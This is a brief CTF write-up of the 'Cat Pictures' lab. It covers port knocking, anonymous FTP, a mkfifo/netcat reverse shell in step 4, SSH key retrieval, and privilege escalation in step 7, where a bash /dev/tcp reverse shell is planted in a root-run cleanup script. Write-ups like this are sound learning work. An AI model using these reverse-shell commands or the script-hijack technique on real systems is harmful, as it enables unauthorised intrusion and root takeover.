# CTF Writeup: Cat Pictures

---

- Step 1: Made nmap scan --> 21 filtered, 22 open, 8080 open, made dir scan with multiple tools, no results
subdomain scan no results, ran sql map on login page --> injections not possible 
- Step 2: checked message from user in forum --> port knocking --> for PORT in 1111 2222 3333 4444; do nc -vz 10.10.137.195 $PORT; done;
executed this script multiple times and after 2nd time the ftp connection wasn't filtered anymore. Logged in with anonymous user --> retrieved notes.txt --> port 4420 and password creds --> logged in --> 
- Step 3: went into catlover user --> and made ls -la on script --> prompted me that it's only possiblr with a shell
- Step 4: started up listener and prompted revshell script "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.21.156.104 4444 >/tmp/f"--> gained rce --> retrieved first flag
- Step 5: analyzed runme script and got password: rebecca --> made ./runme and typed in rebecca --> after some time got id_rsa private key
- Step 6: made ssh -i id_rsa5 catlover@target_ip + chmod 600 id_rsa5 and gained access. It says I have root, but my hostname
are weird numbers and when I make ls -la there is a .dockerenv file which indicates that I am in a docker file. 
- Step 7: found clean.sh script in /opt/clean dir which has root owner rights, which we can edit --> made nano /opt/clean/clean.sh and added bash rev shell inside the bash file /bin/bash -i >& /dev/tcp/10.21.156.104/1234 0>&1 + added listener 
--> gained root rce --> retrieved root flag.

---

# Key Learnings

- First Contact with port knocking 
- Improved mindset towards privilege escalation and enumeration methodology
- 
